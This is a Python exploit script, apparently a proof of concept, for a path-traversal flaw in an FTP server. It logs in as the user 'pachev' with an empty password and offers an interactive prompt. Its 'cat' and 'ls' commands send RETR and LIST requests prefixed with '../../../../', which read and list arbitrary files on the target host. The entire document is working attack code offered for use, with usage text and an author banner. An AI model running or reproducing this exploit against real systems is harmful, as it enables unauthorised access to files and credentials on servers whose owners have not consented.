from ftplib import FTP
import sys

print('''                                                                                                                                
@@@@@@@@ @@@@@@@ @@@@@@@     @@@@@@ @@@@@@@@ @@@@@@@  @@@  @@@ @@@@@@@@ @@@@@@@               @@@@@@@   @@@@@@   @@@@@@@ @@@  @@@ @@@@@@@@ @@@  @@@ 
@@!        @!!   @@!  @@@   !@@     @@!      @@!  @@@ @@!  @@@ @@!      @@!  @@@              @@!  @@@ @@!  @@@ !@@      @@!  @@@ @@!      @@!  @@@ 
@!!!:!     @!!   @!@@!@!     !@@!!  @!!!:!   @!@!!@!  @!@  !@! @!!!:!   @!@!!@!    @!@!@!@!   @!@@!@!  @!@!@!@! !@!      @!@!@!@! @!!!:!   @!@  !@! 
!!:        !!:   !!:            !:! !!:      !!: :!!   !: .:!  !!:      !!: :!!               !!:      !!:  !!! :!!      !!:  !!! !!:       !: .:!  
:          :     :         ::.: :  : :: ::   :   : :    ::    : :: ::   :   : :               :        :   : :  :: :: :  :   : : : :: ::     ::    
            @@@@@@@   @@@@@@ @@@@@@@ @@@  @@@   @@@@@@@ @@@@@@@   @@@@@@  @@@  @@@ @@@@@@@@ @@@@@@@   @@@@@@  @@@@@@  @@@                                
            @@!  @@@ @@!  @@@  @!!   @@!  @@@     @!!   @@!  @@@ @@!  @@@ @@!  @@@ @@!      @@!  @@@ !@@     @@!  @@@ @@!                                
            @!@@!@!  @!@!@!@!  @!!   @!@!@!@!     @!!   @!@!!@!  @!@!@!@! @!@  !@! @!!!:!   @!@!!@!   !@@!!  @!@!@!@! @!!                                
            !!:      !!:  !!!  !!:   !!:  !!!     !!:   !!: :!!  !!:  !!!  !: .:!  !!:      !!: :!!      !:! !!:  !!! !!:                                
                :        :   : :   :     :   : :      :     :   : :  :   : :    ::    : :: ::   :   : : ::.: :   :   : : : ::.: :                           

+---------------------------------------+                                                                                                                                                    
ᑭOᑕ ᗷY: ᖴ4 [https://beacons.ai/f4_zzz]

Commands: 
ls <full dir path>  
cat <full file path>
exit
+---------------------------------------+  

''')

if len(sys.argv) != 3:
    sys.exit('Error! Usage: exploit.py <IP> <PORT>\n')
    
ip = str(sys.argv[1])
port = int(sys.argv[2])

def main():
    try:
        ftp = FTP()
        ftp.connect(host=ip, port=port)
        ftp.login('pachev', '')   
    except:
        sys.exit('The Server Refused The Connection!\n') 

    cmd = input('~# ')
    parse = cmd.split(' ')
    command = parse[0]

    if cmd == 'exit':
        sys.exit('Bye :)\n')
    else:
        try: 
            if command == 'cat':
                ftp.retrbinary(f'RETR ../../../../../../../..{parse[1]}', open('cmdout.txt', 'wb').write)
            elif command == 'ls':
                ftp.retrbinary(f'LIST ../../../../../../../..{parse[1]}', open('cmdout.txt', 'wb').write)
            else:
                print('Invalid command! Use only "ls <full dir path>" or "cat <full file path>".\n')
                main()
            ftp.close()
            file = open('cmdout.txt', 'r')
            print(file.read())
        except:
            print('This file/path does not exist\n')
    main()
main()
